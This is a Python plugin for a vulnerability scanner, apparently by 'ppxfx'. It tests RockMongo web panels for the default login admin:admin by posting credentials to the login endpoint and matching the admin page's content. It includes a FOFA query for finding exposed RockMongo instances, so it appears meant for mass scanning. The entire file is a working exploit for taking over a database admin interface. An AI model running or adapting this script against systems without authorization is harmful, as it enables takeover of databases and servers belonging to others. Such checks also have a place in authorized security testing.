#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Rockmongo默认口令',

      'level'     :   'high',

      'FOFA'      :   'app="RockMongo"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Length': '67',
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'Origin': url,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Referer': f'{url}/index.php?action=login.index&host=0',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'zh-CN,zh;q=0.9',
      'Connection': 'close',
      }
  target = '/index.php?action=login.index'
  data = 'more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    # print(res.headers)
    # print(res.text)
    if res.status_code == 200 and re.search(r'服务器.*?状态.*?数据库.*?action=server.createDatabase" target="right".*?进程.*?命令.*?代码执行.*?',res.text,re.S):
      ret['huixian'] = 'admin:admin'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret